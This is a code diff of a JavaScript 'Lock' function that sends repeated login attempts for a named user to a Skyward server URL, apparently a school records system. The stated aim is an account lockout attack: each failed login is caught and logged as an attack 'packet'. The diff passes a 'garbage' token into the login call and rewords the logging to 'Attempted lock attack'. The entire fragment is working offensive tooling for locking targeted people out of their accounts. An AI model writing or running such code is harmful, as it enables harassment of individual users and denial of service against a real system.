@@ -10,13 +10,14 @@ async function Lock(username, requests = 16) {
       // Code hack for fake error handling
       try {
         // Send virtually empty packets to authenticate
-        await skye(process.env.SKYWARD_URL).login(username);
+        // Pass token as garbage data
+        await skye(process.env.SKYWARD_URL).login(username, token);
       } catch (err) {
         // Technically not necessary but catch needs content or bypassed
-        console.log(`[Lock Attack] Packet: ${i + 1}`);
+        console.log(`> [LOCK] Packet ${i + 1} sent.`);
       }
     }
-    res(`${requests} requests sent to ${username}.`);
+    res(`Attempted lock attack with ${requests} requests on ${username}`);
   });
 }
 
